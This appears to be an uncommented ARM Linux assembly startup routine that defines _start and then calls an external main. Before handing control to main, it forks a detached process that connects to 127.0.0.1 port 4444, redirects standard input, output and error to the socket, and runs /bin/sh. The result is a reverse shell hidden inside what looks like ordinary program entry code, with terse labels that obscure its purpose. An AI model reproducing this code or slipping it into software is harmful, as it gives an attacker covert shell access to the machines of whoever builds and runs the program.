.section .rodata
.align 4
z:
	.byte 0x02, 0x00
	.byte 0x11, 0x5C
	.byte 127, 0, 0, 1
	.space 8

s:
	.ascii "/bin/sh\0"
.section .text
.global _start
.extern main
_start:
	and sp, sp, #0xFFFFFFF8
	ldr r4, [sp]
	add r5, sp, #4
	ldr r5, [r5]
	add r6, sp, #8
	ldr r6, [r6]
	mov r7, #2
	svc #0
	cmp r0, #0
	bgt p
f:
	mov r7, #112
	svc #0
	mov r7, #2
	svc #0
	cmp r0, #0
	bgt e
g:
	mov r0, #2
	mov r1, #1
	mov r2, #0
	mov r7, #281
	svc #0
	mov r4, r0
	mov r0, r4
	ldr r1, =z
	mov r2, #16
	mov r7, #283
	svc #0
	mov r0, r4
	mov r1, #0
	mov r7, #63
	svc #0
	mov r1, #1
	mov r7, #63
	svc #0
	mov r1, #2
	mov r7, #63
	svc #0
	ldr r0, =s
	mov r1, #0
	mov r2, #0
	mov r7, #11
	svc #0
	mov r0, #1
	mov r7, #1
	svc #0
e:
	mov r0, #0
	mov r7, #1
	svc #0
p:
	mov r0, r0
	mov r7, #7
	svc #0
	mov r0, r4
	mov r1, r5
	mov r2, r6
	bl main
	mov r7, #1
	svc #0
